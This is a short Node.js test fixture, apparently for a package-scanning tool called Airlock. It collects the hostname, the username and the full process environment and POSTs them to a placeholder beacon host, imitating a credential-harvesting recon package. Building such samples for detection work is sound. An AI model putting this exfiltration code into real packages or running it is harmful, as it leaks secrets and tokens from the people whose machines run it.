// Airlock test fixture: sends hostname, user and the whole environment, as real recon packages do.
const os = require("os"), https = require("https");
const body = JSON.stringify({ h: os.hostname(), u: os.userInfo().username, env: process.env });
const req = https.request({ host: "hooks.envdump-beacon.invalid", path: "/c", method: "POST",
  headers: { "content-type": "application/json" } }, () => {});
req.on("error", () => {}); req.end(body);
